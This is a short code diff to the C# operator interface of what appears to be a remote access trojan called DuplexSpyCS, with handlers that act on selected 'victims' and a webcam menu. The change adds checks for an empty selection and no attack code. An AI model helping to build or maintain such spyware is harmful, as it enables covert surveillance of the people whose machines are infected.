@@ -1860,6 +1860,13 @@ namespace DuplexSpyCS
         //WEBCAM
         private void toolStripMenuItem8_Click(object sender, EventArgs e)
         {
+            List<ListViewItem> items = newListView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selected!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
             foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 if (item.SubItems[9].Text != "0")
@@ -2543,6 +2550,11 @@ namespace DuplexSpyCS
         private void toolStripMenuItem44_Click(object sender, EventArgs e)
         {
             List<clsVictim> ls = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            if (ls.Count == 0)
+            {
+                MessageBox.Show("Please select a online machine.", "Nothing is selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
 
             foreach (var victim in ls)
             {
